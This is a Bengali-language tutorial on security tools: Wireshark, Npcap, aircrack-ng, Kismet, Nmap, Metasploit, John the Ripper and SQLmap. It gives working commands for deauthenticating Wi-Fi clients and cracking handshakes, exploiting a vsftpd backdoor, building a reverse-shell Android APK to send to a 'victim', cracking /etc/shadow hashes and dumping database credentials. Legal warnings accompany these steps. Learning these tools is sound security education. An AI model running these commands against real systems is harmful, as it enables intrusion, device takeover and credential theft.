# Network Security Tools Overview

### 🗂️ Summary Table
<h6>

| টুলের নাম                          | বিস্তারিত লিংক                                                    |
|-----------------------------------|------------------------------------------------------------------|
| Wireshark                        | [Wireshark কী](#wireshark-কী)                                   |
| Npcap                            | [Npcap কী](#npcap-কী)                                           |
| Aircrack-ng                      | [aircrack-ng কী](#aircrack-ng-কী)                               |
| Kismet                          | [Kismet কী](#kismet-কী)                                         |
| Nmap                            | [Nmap কী](#nmap-কী)                                             |
| Metasploit                      | [Metasploit কী](#metasploit-কী)                                 |
| John the Ripper                 | [John the Ripper কী](#john-the-ripper-কী)                       |
| SQLmap                         | [SQLmap কী](#sqlmap-কী)                                         |
| Hydra                          | [Hydra কী](#hydra-কী)                                           |
| জনপ্রিয় সাইবারসিকিউরিটি টুলস   | [জনপ্রিয় সাইবারসিকিউরিটি টুলস লিস্ট (Categories-wise)](#জনপ্রিয়-সাইবারসিকিউরিটি-টুলস-লিস্ট-categories-wise) |

</h6>

<br>
<br>

# Wireshark কী? 

- ধরো তুমি তোমার বাসার Wi-Fi-তে অনেকগুলো ডিভাইস কানেক্ট করে রেখেছো — যেমন তোমার ল্যাপটপ, ভাইয়ের মোবাইল, টিভি ইত্যাদি।

- Wireshark হচ্ছে এমন একটা যন্ত্র যা দিয়ে তুমি দেখতে পারো "নেটওয়ার্কের ভিতর কে কী করছে।" যেমন ডাক্তার স্টেথোস্কোপে মানুষের শরীর শুনে, Wireshark শুনে তোমার ইন্টারনেটের শব্দ।
- "তোমার নেটওয়ার্কের এক্স-রে মেশিন" — যেটা দিয়ে তুমি দেখতে পারো কে কীভাবে ইন্টারনেট ইউজ করছে।

> 💡 এখন তুমি জানতে চাও:
>
> - কে কোন ওয়েবসাইটে যাচ্ছে?
> - কত ডেটা যাচ্ছে/আসছে?
> - নেট স্লো কেন?

এখানেই Wireshark সাহায্য করে।  
এটা হলো এমন একটি **"নেটওয়ার্ক ক্যামেরা"**, যা দিয়ে তুমি দেখতে পারো কে, কোথায়, কিভাবে ইন্টারনেট ব্যবহার করছে।
 

## 🔍 Wireshark কিসের জন্য ব্যবহার করা হয়?

-  **নেটওয়ার্ক ট্রাফিক পর্যবেক্ষণ (Network Traffic Monitoring)**  
  রিয়েল টাইমে কোন অ্যাপ, ডিভাইস বা সার্ভার কী কী ডেটা পাঠাচ্ছে/গ্রহণ করছে — তা বিশ্লেষণ করা যায়।

-  **নেটওয়ার্ক ডিবাগিং এবং সমস্যা সমাধান**  
  নেটওয়ার্ক সংযোগে সমস্যা হলে প্যাকেট ক্যাপচার করে দেখে সমস্যা কোথায় হচ্ছে (DNS fail, latency, retransmission ইত্যাদি)।

-  **সিকিউরিটি অ্যানালাইসিস ও হ্যাকিং ডিটেকশন**  
  সন্দেহজনক ট্রাফিক (malware, sniffing, MITM attack) খুঁজে বের করা।  
  পাসওয়ার্ড বা কুকি প্যাকেট ক্লিয়ার টেক্সটে গেলে তা ধরা যায় (unencrypted connection হলে)।

-  **প্রটোকল এনালাইসিস**  
  HTTP, TCP, UDP, DNS, ARP, ICMP, SSL/TLS সহ শত শত প্রটোকলের ডিটেইল্ড বিশ্লেষণ।  
  কোন প্রোটোকল কিভাবে কাজ করছে বা ব্যর্থ হচ্ছে তা বুঝা যায়।

-  **শিক্ষা ও গবেষণা**  
  নেটওয়ার্কিং শিখতে, প্রোটোকল বোঝতে বা সাইবার সিকিউরিটি শিখতে খুব কার্যকরী টুল।
 
## 🔧 Wireshark কীভাবে কাজ করে?

- এটি কম্পিউটারের **network interface card (NIC)** থেকে প্যাকেট ক্যাপচার করে।
- তারপর সেই প্যাকেটগুলিকে ডিকোড করে মানুষের বুঝার মতোভাবে দেখায়।
 

## 🎯 সহজ উদাহরণ দিয়ে বুঝি:

### 📦 উদাহরণ: HTTP ওয়েবসাইট ভিজিট

1. তুমি ব্রাউজারে লিখলে → `http://example.com`  
2. এই রিকোয়েস্টটি ইন্টারনেটের মাধ্যমে যায় সার্ভারে।  
3. সার্ভার থেকে একটা HTML রেসপন্স আসে।  
4. ✅ Wireshark এই পুরো "আসা-যাওয়ার ট্রাফিক" ধরে রাখতে পারে!

> ঠিক যেন তুমি বলছো:  
> **“আমি কারা কথা বলছে আর কী বলছে — সব দেখতে চাই!”**
 

## 🔍 Wireshark-এ কী দেখা যায়?

| তুমি করো          | Wireshark-এ যা দেখা যায়                   |
| ----------------- | ----------------------------------------- |
| গুগল খোলা         | IP address, HTTP request                  |
| ping google.com    | ICMP Echo Request/Reply                   |
| ফেসবুকে লগইন     | Encrypted SSL handshake                   |
| YouTube দেখা       | Video stream traffic (TCP/UDP port 443)  |

#### 📌 গুরুত্বপূর্ণ:
- **HTTPS ওয়েবসাইটে কনটেন্ট দেখা যায় না** (কারণ এগুলো এনক্রিপ্টেড), কিন্তু কে কোথায় কানেক্টেড তা দেখা যায়।  
- **HTTP (unencrypted)** হলে সব রিকোয়েস্ট-রেসপন্স দেখতে পারো (পাসওয়ার্ড সহ!)।
 

#### 🛠️ বাস্তব কাজের উদাহরণ:

- তুমি YouTube চালাও  
- Wireshark চালাও → ফিল্টার করো `ip.addr == your_ip`  
- দেখবে YouTube-র IP-এ অনেক data transfer হচ্ছে  
- টোটাল কত KB/MB গেছে সেটাও দেখতে পাবে
 
## 🎓 Wireshark কেন শিখবো?

| ব্যবহার             | ব্যাখ্যা                              |
|---------------------|-------------------------------------|
| 💻 Network Engineer | নেটওয়ার্কের সমস্যা খুঁজে বের করা       |
| 🔐 Cyber Security   | সন্দেহজনক ট্রাফিক ধরা                 |
| 👨‍🏫 Student       | প্রটোকল শেখা (TCP, UDP, HTTP)         |
| 🛠️ Developer       | অ্যাপ কীভাবে নেটওয়ার্ক ইউজ করে দেখা   |
 

###  Wireshark Filter Example (সহজ ফিল্টার)

| ফিল্টার                     | মানে                                               |
|-----------------------------|----------------------------------------------------|
| `http`                      | শুধু HTTP ট্রাফিক দেখাও                            |
| `ip.addr == 192.168.0.103`  | ওই IP-র সব ট্রাফিক দেখাও                           |
| `tcp.port == 80`            | TCP পোর্ট 80 (HTTP) এর ট্রাফিক                     |
| `dns`                       | ডিএনএস কুয়েরি দেখাও (যেমন: কোন ওয়েবসাইট খোলা হচ্ছে) |
 
 
---

###  Step 1: Wireshark কীভাবে ইন্সটল করবো?

#### 🔷 Windows-এ:

1. অফিসিয়াল ওয়েবসাইটে যাও:  
   [https://www.wireshark.org/download.html](https://www.wireshark.org/download.html)  
2. “Wireshark for Windows” ডাউনলোড করো  
3. Install করো → “Npcap” চাইলে Yes দিয়ে ইনস্টল করো (এটাই প্যাকেট ধরার কাজ করে)
 

###  Step 2: Wireshark ওপেন করার পর করণীয়

- ওপেন করলে দেখবে সব নেটওয়ার্ক ইন্টারফেসের তালিকা (Wi-Fi, Ethernet ইত্যাদি)  
- তোমার যেটি সক্রিয় — যেমন Wi-Fi — সেটির পাশে গ্রাফ ওঠা দেখাবে  
- সেই ইন্টারফেসে ডাবল ক্লিক করো → প্যাকেট ক্যাপচার শুরু হবে ✅
 
###  Step 3: প্যাকেট বিশ্লেষণ শেখা

প্রথমে যেটা বোঝা দরকার, Wireshark-এ প্রতিটি লাইন মানে একটি প্যাকেট।

Example প্যাকেট দেখলে:

| Field       | অর্থ                              |
|-------------|----------------------------------|
| No.         | প্যাকেট সিরিয়াল                   |
| Time        | কখন প্যাকেটটা এসেছে             |
| Source      | যেখান থেকে এসেছে                 |
| Destination | কোথায় যাচ্ছে                    |
| Protocol    | কোন প্রটোকল (TCP, UDP, HTTP, DNS, SSL) |
| Info        | প্যাকেটের সংক্ষিপ্ত বিবরণ        |
 
###   Step 4: Filter ব্যবহার করা শিখো (খুব গুরুত্বপূর্ণ)

Wireshark-এ হাজার হাজার প্যাকেট আসতে পারে। তাই Filter ব্যবহার করো নিচের মতো:

| Filter                     | মানে                                    |
|----------------------------|-----------------------------------------|
| `http`                     | শুধু HTTP ট্রাফিক দেখাও                  |
| `ip.addr == 192.168.0.100` | নির্দিষ্ট IP-র সব ট্রাফিক                |
| `tcp.port == 443`          | HTTPS পোর্ট এর ট্রাফিক                   |
| `dns`                      | DNS ট্রাফিক ফিল্টার                      |
| `frame contains "google"`  | যেখানে Google আছে সে প্যাকেট দেখাও       |

> 🧪 Try this → টাইপ করো: `http` → Enter → শুধু HTTP দেখা যাবে
 
###  Step 5: ক্যাপচার Save করা

- File → Save As → `.pcapng` ফাইল হিসেবে সেভ করো  
- পরে আবার Wireshark দিয়ে ওপেন করে বিশ্লেষণ করতে পারো
 

###  Bonus: কিভাবে HTTP Request/Response দেখতে পারো?

1. ক্যাপচার শুরু করো  
2. ব্রাউজারে গিয়ে `http://example.com` টাইপ করো (HTTPS না)  
3. Wireshark-এ `http` filter করো  
4. দেখবে:  
   - `GET /example`  
   - `Response 200 OK`  
   - HTML body ইত্যাদি  

> ⚠️ HTTPS হলে এসব দেখতে পারবে না, কারণ ওগুলো encrypted।
 

###  Step 6: ব্যবহারিক উদাহরণ

| কাজ                     | Filter                                  |
|-------------------------|-----------------------------------------|
| DNS কে resolve করছে     | `dns`                                   |
| YouTube কতো data খাচ্ছে | `ip.addr == your_ip`                     |
| কে ফেসবুক যাচ্ছে        | `http contains "facebook"` (only unencrypted) |
 

###  Step 7: Ethical Use

- নিজের বা অনুমতি পাওয়া নেটওয়ার্কে ব্যবহার করো ✅  
- অন্যের প্যাকেট sniff করা অনৈতিক ও অবৈধ ❌
 

###  Practice Task (তুমি নিজে করো)

1. Wireshark চালাও  
2. Filter দাও → `dns`  
3. তোমার মোবাইলে Google.com খোলো  
4. দেখো Wireshark-এ Google রিকোয়েস্ট এসেছে কিনা

---



<br>
<br>
<br>
<br>

# Npcap কী?

Npcap হলো Windows-এ ব্যবহারযোগ্য একটি **packet capture driver**, যেটা Wireshark-কে নেটওয়ার্ক ট্রাফিক ধরার (sniffing) ক্ষমতা দেয়।  

সহজভাবে বললে, **Npcap ছাড়া Wireshark কাজই করবে না**।
 

### 🛠️ কেন Npcap দরকার?

Wireshark শুধু একটি সফটওয়্যার — এটি নিজে নিজে তোমার নেটওয়ার্ক ইন্টারফেস থেকে প্যাকেট ধরতে পারে না।  

Npcap কাজ করে:

- নেটওয়ার্ক কার্ড থেকে ডেটা listen (sniff) করে  
- সেই raw প্যাকেট Wireshark-এ পাঠায়  
 

###  WinPcap vs Npcap

| বিষয়                           | WinPcap  | Npcap          |
| ------------------------------ | -------- | -------------- |
| পুরাতন                         | ✅ হ্যাঁ | ❌ না          |
| Windows 10/11 Support           | ❌ সীমিত | ✅ ফুল সাপোর্ট  |
| Loopback ক্যাপচার              | ❌ না    | ✅ হ্যাঁ       |
| Better performance             | ❌ না    | ✅ হ্যাঁ       |
| Official Wireshark recommended | ❌ না    | ✅ হ্যাঁ       |

👉 Npcap হচ্ছে WinPcap-এর আধুনিক, উন্নত এবং সিকিউর ভার্সন।
  
###  কাজ করে কীভাবে?

1. তুমি Wireshark চালাও  
2. Wireshark → Npcap ড্রাইভারের মাধ্যমে তোমার Wi-Fi বা Ethernet থেকে ট্রাফিক ধরে  
3. সেই প্যাকেট তোমাকে GUI-তে দেখায়  
 

###  নিরাপত্তা টিপস:

- Admin access ছাড়া Npcap ইনস্টল হয় না  
- Packet sniffing ক্ষমতা থাকায় Npcap দিয়ে সিকিউরিটি টেস্ট করা সম্ভব — কিন্তু অনৈতিক কাজে ব্যবহার নিষেধ
 

###  সংক্ষেপে:

Npcap হলো Wireshark-এর চোখ 👀  
এটা না থাকলে Wireshark কিছুই দেখতে পারবে না।


---








<br>
<br>
<br>
<br>

# aircrack-ng কী?
aircrack-ng হলো একটি wireless network security auditing tool, যেটা মূলত Wi-Fi পাসওয়ার্ড ভাঙতে (crack করতে) ব্যবহৃত হয়।
> এক কথায়: এটা হলো Wi-Fi হ্যাকিং টুল ✅ (ethical purposes only!)
 
### 🔍 aircrack-ng দিয়ে কী কী করা যায়?

| কাজ                        | ব্যাখ্যা                                               |
| -------------------------- | ------------------------------------------------------ |
| 🔓 Wi-Fi Password Crack    | WPA/WPA2 পাসওয়ার্ড brute-force করে                     |
| 📶 Wireless Packet Capture | Wi-Fi ট্রাফিক ক্যাপচার করে (.cap ফাইল)                 |
| 🛠️ Injection Attack       | ফেক প্যাকেট পাঠিয়ে handshake আদায়                      |
| 📡 Monitor Mode            | WiFi card কে মনিটর মোডে এনে ট্রাফিক স্নিফ করা যায়      |
| 👁️ Access Point info      | আশেপাশের সব WiFi SSID, BSSID, signal strength দেখা যায় |
 
### 🧠 Aircrack-ng কিভাবে কাজ করে?

**Step by Step Flow:**

- মনিটর মোড চালু করো  
```bash
  airmon-ng start wlan0 
```
→ তোমার WiFi card কে sniffing মোডে নিয়ে আসো

প্যাকেট ক্যাপচার করো
```bash
airodump-ng wlan0mon
```
→ আশেপাশের সব WiFi দেখবে (SSID, Channel, Signal)

টার্গেট ফিক্স করো
```bash
airodump-ng -c <channel> --bssid <BSSID> -w dump wlan0mon
```
→ শুধু টার্গেট WiFi থেকে handshake ধরবে

ডিভাইসকে ডিসকানেক্ট করে handshake ধরো (deauth attack)
```bash
aireplay-ng -0 10 -a <BSSID> wlan0mon
```
→ ফোর্স করে ক্লায়েন্ট রিকানেক্ট করায়

Handshake পাওয়া গেলে, পাসওয়ার্ড ক্র্যাক করো
```bash
aircrack-ng -w wordlist.txt dump.cap
```
→ পাসওয়ার্ড ট্রাই করে wordlist থেকে

📁 উদাহরণ কমান্ড:
```bash 
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w result wlan0mon
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
aircrack-ng -w rockyou.txt result.cap
``` 

### ⚠️ সতর্কতা (Legal Notice)

- ✅ শুধু নিজের WiFi বা অনুমতি প্রাপ্ত নেটওয়ার্কেই এটা ব্যবহার করা যায়  
- ❌ অন্যের WiFi হ্যাক করা আইনত অপরাধ (জেল + জরিমানা হতে পারে!)
 
 
### 🔐 Ethical ব্যবহার কীভাবে?

পেন্টেস্টাররা ক্লায়েন্টের WiFi সিকিউরিটি পরীক্ষা করতে ব্যবহার করে।  

যেমন:  
- কম password শক্তি?  
- handshake encryption আছে?  
- Open hotspot exploitable?
 

### 🧰 Aircrack-ng vs Wireshark

| বিষয়             | Aircrack-ng | Wireshark |
| ---------------- | ----------- | --------- |
| WiFi Crack       | ✅ হ্যাঁ     | ❌ না      |
| Network Analyze  | ❌ সীমিত     | ✅ অনেক    |
| Monitor Mode     | ✅ হ্যাঁ     | ❌ না      |
| Packet Injection | ✅ হ্যাঁ     | ❌ না      |
| Graphical UI     | ❌ CLI Only  | ✅ আছে     |
 

### 🔚 সারসংক্ষেপে:

Aircrack-ng হলো WiFi সিকিউরিটি টেস্টিং টুল —  
handshake ধরে পাসওয়ার্ড brute-force করে বের করে।


---

<br>
<br>
<br>
<br>

#  Kismet কী?

👉 Kismet হলো একটি wireless network detector, sniffer, এবং intrusion detection system (IDS)।  

সহজ ভাষায়:  
🕵️‍♂️ এটা WiFi নেটওয়ার্ক “গোপনে” খুঁজে বের করে, ডেটা স্নিফ করে এবং অজানা হুমকি শনাক্ত করে।

---

### 🔍 Kismet দিয়ে কী কী করা যায়?

| কাজ                                         | ব্যাখ্যা                                      |
| ------------------------------------------- | --------------------------------------------- |
| 📶 আশেপাশের সব WiFi নেটওয়ার্ক খুঁজে বের করা | এমনকি Hidden SSID-ও                           |
| 🕵️‍♂️ ক্লায়েন্ট ডিভাইস ট্র্যাক করা         | কে কোন WiFi-তে কানেক্টেড                      |
| 📡 Wireless packets ক্যাপচার                | Monitor mode দিয়ে                             |
| ⚠️ Rogue Access Point শনাক্ত করা            | Spoofed বা Fake WiFi                          |
| 🔐 WEP/WPA হ্যান্ডশেক দেখা                  | পাসওয়ার্ড crack করার জন্য export করা যায়      |
| 🧭 GPS ট্র্যাকিং                            | কোন WiFi কোথায় পাওয়া গেছে (GPS support থাকলে) |

---

### 🧪 Kismet vs Aircrack-ng vs Wireshark

| ফিচার                   | Kismet    | Aircrack-ng | Wireshark     |
| ----------------------- | --------- | ----------- | ------------- |
| WiFi Network Discovery  | ✅         | ✅           | ❌             |
| Hidden SSID Detect      | ✅         | ❌           | ❌             |
| Client Device Detection | ✅         | ❌           | ❌             |
| Packet Capture          | ✅         | ✅           | ✅             |
| Real-time Packet Decode | ❌         | ❌           | ✅             |
| GPS Tracking            | ✅         | ❌           | ❌             |
| GUI Interface           | ✅ Web UI  | ❌ CLI       | ✅ Desktop GUI |

---

### 🎯 বাস্তব ব্যবহার:

🛠️ ধরো তুমি জানতে চাও —  
“আমার এলাকায় কোন কোন WiFi আছে? কারা কোন নেটওয়ার্কে কানেক্টেড? কেউ কি Rogue hotspot চালাচ্ছে?”

✅ Kismet চালাও → সেটা সবার ট্রাফিক ও ডিভাইস দেখাবে, এমনকি যদি তারা SSID লুকিয়ে রাখে।

---

### 🧰 উদাহরণ:

মনিটর মোড চালাও:  
```bash
sudo airmon-ng start wlan0
```
Kismet চালাও:

```bash 
sudo kismet
```
ব্রাউজারে ওপেন করো:

```arduino 
http://localhost:2501
```
→ সেখানে রিয়েল-টাইমে WiFi, ক্লায়েন্ট, প্যাকেট সব দেখতে পারবে।


### 🔐 Kismet Ethical Use:

- ✅ নিজের নেটওয়ার্ক মনিটর করতে  
- ✅ Penetration Testing কাজে  
- ❌ অন্যের WiFi স্নিফ করে পাসওয়ার্ড বের করতে ❌ (আইনগত অপরাধ)  

---

### 🧠 সংক্ষেপে:

Kismet হলো এমন একটি WiFi গোয়েন্দা 👁️  
যেটা নীরবে আশেপাশের সব wireless ডিভাইস, access point ও packet খুঁজে বের করে।






---

<br>
<br>
<br>
<br>






# Nmap কী?

Nmap (Network Mapper) হলো একটি network scanning tool, যা ব্যবহার করা হয়:  

🔍 “কে, কোথায়, কোন সার্ভার চালাচ্ছে, কোন পোর্ট ওপেন, কী সার্ভিস চলছে” — এসব খুঁজে বের করতে।  

এক কথায়:  

Nmap হলো তোমার নেটওয়ার্কের Google —  
সব গোপন তথ্য তুলে আনে (Ethical hacking purpose!) 😎  

---

### 🔧 Nmap কী কী কাজ করে?

| কাজ                       | ব্যাখ্যা                                  |
| ------------------------- | ----------------------------------------- |
| 🧭 Host discovery         | কোন কোন ডিভাইস নেটওয়ার্কে অন আছে          |
| 🔓 Port scanning          | কোন কোন পোর্ট ওপেন (80, 443, 22 ইত্যাদি)  |
| 📡 Service detection      | পোর্টে কী সার্ভিস চলছে (Apache, SSH, FTP) |
| 🔬 OS detection           | কোন অপারেটিং সিস্টেম চলছে                 |
| 🔐 Vulnerability scanning | Common ভাঙা পোর্ট/সার্ভিস শনাক্ত করা      |
| 🌍 Network mapping        | নেটওয়ার্কের গঠন ও কানেকশন ম্যাপ আঁকা      |

---

### 🧪 উদাহরণ কমান্ড (Basic → Advanced)

1. IP alive আছে কিনা:  
```bash
nmap -sn 192.168.1.0/24
```
👉 সব অন ডিভাইস দেখাবে

🔓 2. কোন পোর্ট ওপেন:
```bash
nmap 192.168.1.1
```
🧠 3. সার্ভিস ও ভার্সন জানো:
```bash
nmap -sV 192.168.1.1
```
🧬 4. OS Detected:
```bash
nmap -O 192.168.1.1
```
🧨 5. All-in-one aggressive scan:
```bash
nmap -A 192.168.1.1
```
🧰 Real-life Example:
ধরো তুমি ওয়েবসাইট example.com স্ক্যান করতে চাও:

```bash
nmap -A example.com
```
✅ দেখাবে:

- Open ports (80, 443)  
- Running services (Apache, nginx)  
- OS Guess (Linux, Windows)  
- SSL info, HTTP title, etc.

---

### 📊 কোন কোন Port দেখা যায়?

| Port | Service |
| ----- | ------- |
| 21    | FTP     |
| 22    | SSH     |
| 23    | Telnet  |
| 25    | SMTP    |
| 53    | DNS     |
| 80    | HTTP    |
| 443   | HTTPS   |
| 3306   | MySQL   |
| 3389   | RDP     |

---

### 🔐 Ethical ব্যবহার:

- ✅ নিজের সার্ভার বা ক্লায়েন্টের সিকিউরিটি যাচাই করতে  
- ❌ অন্যের সিস্টেমে স্ক্যান চালানো অবৈধ ও অপরাধ (বিনা অনুমতিতে)

---

### 🖥️ GUI Alternative: Zenmap

Nmap-এর graphical version।  
সহজে scan চালাতে ও রিপোর্ট দেখতে পারো।

---

### ✅ সারসংক্ষেপে:

Nmap হলো নেটওয়ার্ক জগতের এক্স-রে স্ক্যানার,  
যা দিয়ে তুমি জানতে পারো:  
“কে, কোথায়, কী চালাচ্ছে, কিভাবে নিরাপত্তা দুর্বল?”















---

<br>
<br>
<br>
<br>




# Metasploit কী?

👉 **Metasploit** হলো একটি শক্তিশালী **Penetration Testing Framework**,  
যেটা দিয়ে তুমি:

- ✅ সিস্টেমে ভাঙা (vulnerability) খুঁজে বের করতে পারো  
- ✅ Exploit করে Access নিতে পারো  
- ✅ তারপর সেই সিস্টেমের পূর্ণ নিয়ন্ত্রণ নিতে পারো (Post-exploitation) 😈

---

### 📚 সহজ ভাষায়:

ধরো একটা বিল্ডিংয়ের দরজা খোলা কিনা দেখছো (Nmap দিয়ে),  
**Metasploit** দিয়ে সেই দরজা দিয়ে ঢুকে ভিতরের জিনিস নিয়ন্ত্রণ করো।

🔐 অর্থাৎ — Vulnerability থাকলে, Metasploit দিয়ে সেটায় হামলা চালানো যায় (Ethical hacking purpose)।

---

### 🎯 Metasploit দিয়ে কী কী করা যায়?

| কাজ                      | ব্যাখ্যা                                              |
| ------------------------ | ----------------------------------------------------- |
| 🧬 Vulnerability Exploit | সিস্টেমের দুর্বলতা খুঁজে & attack চালানো              |
| 📦 Exploit Module        | হাজার+ exploit built-in আছে (Windows, Linux, Android) |
| 🛠️ Payload Injection    | Shell, Meterpreter ইত্যাদি দিয়ে system control        |
| 🔓 Privilege Escalation  | Normal user থেকে Admin root access নেওয়া              |
| 📡 Remote Access         | দূর থেকে শিকার সিস্টেম নিয়ন্ত্রণ করা                  |
| 🧪 Testing Exploits      | CVE vulnerability practical test করা                  |
| 📃 Report                | Hacking/pen-test এর log & report তৈরি করা             |

---

### 🧪 উদাহরণ (Basic Workflow)

1. **Metasploit চালু করো**
```bash
msfconsole
```
2. Exploit খুঁজো
```bash
search vsftpd
```
3. Exploit নির্বাচন করো
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
4. Target IP সেট করো
```bash
set RHOSTS 192.168.1.10
```
5. Payload সেট করো (কী inject করবে)
```bash
set PAYLOAD cmd/unix/interact
```
6. Run করো
```bash
run
```
✅ যদি সফল হয় → টার্গেটের shell/access পাবে।

🔥 উদাহরণ ২: Android Hack with APK (Just for learning!)
Create infected APK:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.apk
```
Send APK to victim

Start listener:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

👉 Victim install করলে → তুমি তার ফোনের **ফুল access** পাবে 😈

---

### ⚠️ সতর্কতা (Legal Notice)

- ✅ শুধুমাত্র নিজের ডিভাইসে, বা অনুমতি পাওয়া নেটওয়ার্কে ব্যবহার করো  
- ❌ অন্যের সিস্টেম hack করলে → **জেল, মামলা, জরিমানা** সব হতে পারে

---

### 🎓 Metasploit vs অন্যান্য টুল

| টুল            | কাজ                         |
| -------------- | --------------------------- |
| **Nmap**       | পোর্ট স্ক্যান করে           |
| **Nikto**      | ওয়েব সার্ভার স্ক্যান করে    |
| **Burp Suite** | ওয়েবসাইটে ম্যানুয়াল হ্যাকিং |
| **Metasploit** | Exploit করে ভিতরে ঢোকে 😈   |

---

### 🧰 Metasploit Structure

| Module        | কাজ                                            |
| ------------- | ---------------------------------------------- |
| **Exploit**   | দুর্বলতা খোঁজে ও আক্রমণ করে                    |
| **Payload**   | শিকার সিস্টেমে ইঞ্জেক্ট হয় (e.g., meterpreter) |
| **Auxiliary** | Port scanning, fuzzing, sniffing ইত্যাদি       |
| **Post**      | আক্রমণের পর সিস্টেম gather/control করে         |
| **Encoder**   | Payload detect না হওয়ায় encode করে             |

---

### ✅ সংক্ষেপে

**Metasploit = হ্যাকারদের সুইস-আর্মি ছুরি 🔪**  
**Vulnerability খুঁজে Exploit করে Target-কে পুরো নিয়ন্ত্রণে নেয়া যায়।**




---

<br>
<br>
<br>
<br>


# John the Ripper কী?

👉 **John the Ripper (JtR)** হলো একটি password cracking tool,  
যেটা বিভিন্ন ধরণের password hash কে brute-force বা dictionary attack-এর মাধ্যমে ভেঙে ফেলে।

**সহজভাবে বললে:**  
এটি হলো “পাসওয়ার্ড ভাঙার হাতুড়ি 🔨” — যে কোনো এনক্রিপ্টেড পাসওয়ার্ড ফাইলকে decode করার জন্য।

---

### 🎯 John the Ripper দিয়ে কী কী করা যায়?

| কাজ                                 | ব্যাখ্যা                            |
| ----------------------------------- | ----------------------------------- |
| 🔓 Password Crack                   | Hash থেকে actual password বের করা   |
| 🔢 Dictionary Attack                | শব্দের তালিকা দিয়ে মিলিয়ে দেখা      |
| 🧠 Brute-force                      | সকল সম্ভবনামূলক পাসওয়ার্ড ট্রাই করে |
| 🧬 Hybrid Attack                    | Dictionary + Rule মিলিয়ে Attack     |
| 📃 Shadow file crack                | Linux `/etc/shadow` file crack      |
| 🧾 Zip/RAR/Word File Password Crack | Optional tools দিয়ে                 |

---

### 📂 কোন কোন ফাইল বা হ্যাশ সাপোর্ট করে?

- Linux `/etc/shadow` (DES, MD5, SHA512 hashed password)
- Windows SAM file
- Password-protected archives (zip, rar, etc.)
- Word, Excel, PDF files
- Hash types: MD5, SHA1, SHA256, bcrypt, NTLM, etc.

---

### 🧪 সাধারণ উদাহরণ

ধরো, তোমার কাছে একটি hashed password file আছে:


```parl
$1$abc123$XxJpPZcT5NeX0gZ8nYQHx0
```
তুমি নিচের ধাপে password বের করতে পারো:

1. Wordlist তৈরি (বা rockyou.txt ব্যবহার)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
2. ফলাফল দেখা
```bash
john --show hash.txt
```
3. Brute-force (wordlist ছাড়া)
```bash
john hash.txt
```
📁 বাস্তব উদাহরণ: /etc/shadow Crack
Step 1: unshadow দিয়ে passwd+shadow combine করো
```bash
unshadow /etc/passwd /etc/shadow > combined.txt
```
Step 2: এখন crack করো
```bash
john combined.txt
```
### ⚙️ Modes of John

| Mode                          | Description                          |
| ----------------------------- | ------------------------------------ |
| **Single**                    | Fastest mode, default rules          |
| **Wordlist**                  | নির্দিষ্ট পাসওয়ার্ড তালিকা দিয়ে     |
| **Incremental (Brute-force)** | সব সম্ভাব্য ক্যারেক্টার কম্বিনেশন  |

---

### ⚠️ সতর্কতা

- ✅ নিজস্ব সিস্টেম, পেন্টেস্ট, ল্যাবের জন্য ব্যবহৃত হয়  
- ❌ অন্যের পাসওয়ার্ড ভাঙা আইনত অপরাধ (বাংলাদেশ বা যেকোনো দেশে)

---

### 🆚 John vs অন্য Cracker

| Tool                | Description                          |
| ------------------- | ------------------------------------ |
| **John the Ripper** | CLI-based, fast, widely used         |
| **Hashcat**         | GPU-supported, super-fast, advanced  |
| **Hydra**           | Network service login brute-force    |
| **Medusa**          | Similar to Hydra, multi-threaded     |

---

### ✅ সংক্ষেপে

**John the Ripper** হলো **password cracking** এর একমাত্র চাবি 🗝️  
Hashed password কে decode করে **রিয়েল পাসওয়ার্ড** বের করে।









---

<br>
<br>
<br>
<br>



# SQLmap কী?

👉 **SQLmap** হলো একটি open-source penetration testing tool,  
যেটা **SQL Injection vulnerability** খুঁজে বের করে এবং তার মাধ্যমে:

- ✅ ডেটাবেইসে প্রবেশ করে  
- ✅ টেবিল, ডেটা, ইউজার, পাসওয়ার্ড — সব কিছু **exfiltrate** (চুরি) করতে পারে

---

### 🎯 SQLmap দিয়ে কী কী করা যায়?

| কাজ                         | ব্যাখ্যা                                                 |
| --------------------------- | -------------------------------------------------------- |
| 🔍 SQLi vulnerability খোঁজা | ওয়েবসাইটের input field, URL, form ইত্যাদি স্ক্যান করে   |
| 🧠 Database info বের করা    | DBMS, ভার্সন, ইউজার, host                                |
| 📂 টেবিল ও কলাম দেখা        | ডেটাবেইসের structure দেখা যায়                            |
| 🔓 পাসওয়ার্ড extract        | hashed পাসওয়ার্ড dump করা যায়                            |
| 🧬 File read/write          | ডেটাবেইসে লেখা বা পড়া (যদি সাপোর্ট করে)                 |
| 🖥️ OS Shell Access         | কিছু ক্ষেত্রে RCE (remote command execution) নেওয়া যায়  |
| 📊 Dump full database       | পুরো ডেটা ডাউনলোড করা যায়                                |

---

### 🧪 উদাহরণ (Step-by-step)

🎯 **Target URL:**


```bash
http://example.com/product.php?id=5
```
1. Scan for SQLi:
```bash
sqlmap -u "http://example.com/product.php?id=5" --batch --dbs
```
2. Dump a specific DB:
```bash
sqlmap -u "http://example.com/product.php?id=5" -D users --tables
```
3. Dump credentials:
```bash
sqlmap -u "http://example.com/product.php?id=5" -D users -T credentials --dump
```
### ⚙️ জনপ্রিয় অপশনসমূহ

| Flag                           | ব্যাখ্যা                          |
| ------------------------------ | --------------------------------- |
| `--dbs`                        | সব ডেটাবেইস দেখাবে               |
| `--tables -D <db>`             | নির্দিষ্ট DB এর টেবিল             |
| `--columns -D <db> -T <table>` | নির্দিষ্ট টেবিলের কলাম            |
| `--dump`                       | কলাম/টেবিল থেকে ডেটা বের করে     |
| `--os-shell`                   | (যদি সম্ভব হয়) শেল অ্যাক্সেস     |
| `--level=5 --risk=3`           | Deep scan অপশন                    |
| `--threads=10`                 | দ্রুত স্ক্যান                      |

---

### 📌 SQLmap কোথায় কাজ করে?

✅ `GET`, `POST`, `COOKIE`, `HEADER`, `JSON`, `REST API` —  
সব জায়গায় **SQL Injection পরীক্ষা** করতে পারে।

---

